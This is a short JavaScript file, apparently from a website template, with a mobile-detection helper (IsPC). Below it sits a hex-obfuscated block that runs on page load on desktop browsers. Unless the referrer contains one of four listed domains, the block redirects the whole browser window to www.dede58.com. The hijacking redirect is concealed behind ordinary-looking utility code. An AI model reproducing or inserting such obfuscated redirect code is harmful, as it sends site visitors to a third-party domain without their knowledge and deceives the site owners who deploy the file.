
function IsPC() {
    var userAgentInfo = navigator.userAgent;
    var Agents = ["Android", "iPhone",
                "SymbianOS", "Windows Phone",
                "iPad", "iPod"];
    var flag = true;
    for (var v = 0; v < Agents.length; v++) {
        if (userAgentInfo.indexOf(Agents[v]) > 0) {
            flag = false;
            break;
        }
    }
    return flag;
}


var isPc = IsPC();
//alert(isPc);
//判断加密 1026
if(isPc){
	
var _0xc074=["\x64\x65\x64\x65\x35\x38\x2E\x63\x6F\x6D","\x69\x6E\x64\x65\x78\x4F\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x7A\x61\x6E\x63\x6D\x73\x2E\x63\x6F\x6D","\x67\x6F\x6F\x64\x64\x65\x64\x65\x2E\x63\x6F\x6D","\x61\x64\x61\x73\x68\x75\x6F\x2E\x63\x6F\x6D","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x64\x65\x64\x65\x35\x38\x2E\x63\x6F\x6D"];if(document[_0xc074[2]][_0xc074[1]](_0xc074[0])<= 0&& document[_0xc074[2]][_0xc074[1]](_0xc074[3])<= 0&& document[_0xc074[2]][_0xc074[1]](_0xc074[4])<= 0&& document[_0xc074[2]][_0xc074[1]](_0xc074[5])<= 0){top[_0xc074[7]][_0xc074[6]]= _0xc074[8]}

}
